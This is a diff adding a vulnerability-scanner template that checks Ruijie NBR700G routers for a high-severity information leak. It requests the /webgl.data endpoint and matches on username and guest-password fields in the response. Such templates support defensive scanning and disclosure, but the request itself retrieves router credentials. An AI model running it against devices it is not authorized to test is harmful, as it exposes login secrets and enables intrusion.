@@ -1,0 +1,27 @@
+id: ruijie-nbr700g-webgl-data-info-leak
+info:
+  name: "锐捷 NBR700G webgl.data 信息泄露"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ruijie
+  description: |
+    This template detects an information leakage vulnerability in Ruijie NBR700G routers via the `/webgl.data` endpoint.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/webgl.data"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"http_username\""
+          - "\"http_guest_pwd\""
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
